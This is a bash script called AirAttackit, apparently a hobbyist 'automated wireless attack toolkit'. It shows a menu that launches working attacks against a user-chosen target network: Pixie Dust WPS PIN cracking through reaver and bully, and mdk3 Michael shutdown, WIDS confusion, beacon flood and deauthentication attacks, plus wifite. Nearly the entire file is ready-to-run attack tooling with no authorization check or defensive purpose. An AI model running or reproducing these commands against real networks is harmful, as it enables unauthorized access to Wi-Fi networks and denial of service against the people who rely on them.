#!/bin/bash
#Author
#By kickwinner<kickwinner75@gmail.com>
cyan='\e[0;36m'
lightcyan='\e[96m'
green='\e[0;32m'
lightgreen='\e[1;32m'
white='\e[1;37m'
red='\e[1;31m'
yellow='\e[1;33m'
blue='\e[1;34m'
clear
echo -ne '                    ------------------AIRATTACKIT-------------------------------\r'
sleep 1.5
echo -ne '                    -----------Automated----Simple---Attack-Framework----------\r'
sleep 1.5
echo -ne '                     -----------------By kick--------------------------------\r'
sleep 1.5

echo -ne '\n'
function main_menu()
            {
       while :
     do
clear
echo -ne "\033]0;Airattackit(By Kick )\007"
resize -s 31 100
clear

echo -e """ ${red}
********************************************************************************
                     Automated Wirless Attack Toolkit
********************************************************************************
 █████╗ ██╗██████╗  █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗██╗████████╗                      
██╔══██╗██║██╔══██╗██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██║╚══██╔══╝    
███████║██║██████╔╝███████║   ██║      ██║   ███████║██║     █████╔╝ ██║   ██║       
██╔══██║██║██╔══██╗██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ██║   ██║       
██║  ██║██║██║  ██║██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗██║   ██║       
╚═╝  ╚═╝╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝   ╚═╝  
oooo    oooo  o8o            oooo                                  o8o   .o88o.  o8o  
`888   .8P'   `"'            `888                                  `"'   888 `"  `"'  
 888  d8'    oooo   .ooooo.   888  oooo          oooo oooo    ooo oooo  o888oo  oooo  
 88888[      `888  d88' `"Y8  888 .8P'            `88. `88.  .8'  `888   888    `888  
 888`88b.     888  888        888888.    8888888   `88..]88..8'    888   888     888  
 888  `88b.   888  888   .o8  888 `88b.             `888'`888'     888   888     888  
o888o  o888o o888o `Y8bod8P' o888o o888o             `8'  `8'     o888o o888o   o888o 
                                                                                      
                                                                                      


********************************************************************************
                            From kick
********************************************************************************
"""
echo -e """ ${yellow}
________________________________________________________________________________
        (if Your Card Is In Manged Mode Turn On Monitor Mode Before Any Attack)

                       mon.)Put WirelessCard In Monitor Mode
                       man.)Put Wireless Card In Managed Mode
                         r.)Install Requierd Tools
                         e.)Exit
--------------------------------------------------------------------------------
     1.PixleDust Attack(Rever)
     2.PixleDust Attack(Bully)
     3.Micale Shutdown Attack(mdk3)
     4.Wifite(automated Attack FrameWork)
     5.WIDS/WIPS Confusion Attack(mdk3)
     6.Beacon Flood(mdk3)
     7.Deauthentication Attack(mdk3)
"""
read -p "AirAttackit>: " option
case "$option" in 
            mon)clear
                   read -p "Enter Interface Name>: " i
                   airmon-ng start $i
                   read -p "press any key to return ..."
                   clear
                   ;;
             man)clear 
                    read -p "Enter Interface Name>: " i
                    airmon-ng stop $i
                    read -p "press any key to return ..."
                    clear
                    ;;
                 1)clear
                  read -p "Enter Interface Name>: " i
                  gnome-terminal -- wash -i $i
                 read -p "Enter Bssid Of Target Network>: " bssid
                 read -p "Enter Channle Of Target Network>: " c
                 xterm -hold -T "Pixle-WPS(Reaver)" -e "reaver -i $i -b $bssid -c $c -vvv -K 1 -f"
                 ;;
               2)clear
                  read -p "Enter Interface Name>: " i
                  gnome-terminal -- wash -i $i
                 read -p "Enter Bssid Of Target Network>: " bssid
                 read -p "Enter Channle Of Target Network>: " c
                 xterm -hold -T "Pixle-WPS(Bully)" -e "bully -b $bssid $i -c $c -d -v 3"
                 ;;
                3)clear
                 read -p "Enter Interface Name>: " i
                 gnome-terminal -- airodump-ng  $i
                 read -p "Enter Bssid Of Target Network>: " bssid
                 xterm -hold -T "Micale ShutdownAttack(mdk3)" -e "echo 'Attack Is Running./././././././';mdk3 $i m -t $bssid"
                 echo "Attack Is Running./././././././"
                 ;;
                4)clear
                  xterm -hold -T "Wifite Automated Attack" -e "wifite"
                   ;;
                5)clear
                 read -p "Enter Interface Name>: " i
                 gnome-terminal -- airodump-ng  $i
                 read -p "Enter Bssid Of Target Network>: " bssid
                 read -p "Enter essid Of Target Network>: " ssid
                 xterm -hold -T "WIDS/WIPS Confusion Attack(mdk3)" -e "echo 'Attack Is Running./././././././';mdk3 $i w -t $bssid -e $ssid"
                 echo "Attack Is Running./././././././"
                 ;; 
                 
               6)clear
               read -p "Enter Interface Name>: " i
               gnome-terminal -- airodump-ng $i
               read -p "Enter Bssid Of Target Network>: " bssid
               xterm -hold -T "Becon Flood(mdk3)" -e "echo 'Attack Is Running./././././././';mdk3 $i b $bssid"
               echo "Attack Is Running./././././././"
               ;;
              7)clear
                read -p "Enter Interface Name>: " i
               gnome-terminal -- airodump-ng $i
               read -p "Enter Bssid Of Target Network>: " bssid
               xterm -hold -T "Deauth Attack(mdk3)" -e "echo 'Attack Is Running./././././././';mdk3 $i d $bssid"
               echo "Attack Is Running./././././././"
               ;;
                 
                r)clear
                  apt-get update
                  apt-get install hcxdumptool
                  apt-get install hcxtools
                  apt-get install hashcat
                  ;;
                 e)exit
                  ;;
                 
                          

                
          esac
    done
}
main_menu